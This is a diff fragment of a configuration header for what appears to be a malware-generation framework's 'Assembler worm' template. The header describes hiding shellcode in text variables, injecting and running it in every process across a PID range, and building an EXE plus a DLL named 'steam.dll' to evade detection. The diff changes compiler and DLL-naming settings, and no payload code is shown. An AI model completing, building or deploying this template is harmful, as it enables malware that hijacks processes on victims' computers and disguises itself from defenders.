@@ -3,21 +3,22 @@
 #!info##Assembler worm [W]. Hides shellcode in multiple text variables. Checks each PID in the specified range trying to inject shellcode into the process and run. Creates an EXE and DLL file with the injection function to avoid detection.
 #!globalVar##COMPILER_NO_DLL##Not include DLLs
 #!banned##module##starter##shadow##junk
-#!processWorm##ExeLib
+#!processWorm##BasicCombo
 #!lang##asm
 #!system_FLAG##[W]
-#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!globalVar##COMPILER##mingw-x32##Compiler name
 #!globalVar##OS_EXEC##win##Target system executable
+#!globalVar##NO_DLL##True##Not include DLL
 #!reqVar##RR_scode##Shellcode to execute. You can paste your own or use ready-made ones from the FOOD section.##str##LOAD_SHELLCODE:True
 #!reqFood##FOOD_text##FOOD_random_text##Text to fill code
 #!reqVar##RR_start_pid##PID number from which the attack will start.##int
 #!reqVar##RR_stop_pid##PID number to which the attack will be stoped.##int
 #!setVar##RR_start_pid##800##int
 #!setVar##RR_stop_pid##10000##int
-#!options##DLLS_src_temp_dll##DLL_Injector
-#!reqVar##DLL_file_name##Name of DLL file and library that will be created.##str
-#!setVar##DLL_file_name##steam.dll##str
-#!setVar##DLL_src_temp_dll##DLL_Injector##str
+#!reqVar##DLL_NAME##Name of DLL file and library that will be created.##str
+#!setVar##DLL_NAME##steam.dll##str
+#!reqSMod##DLL_Injector
+
 
 
 extern _ExitProcess@4
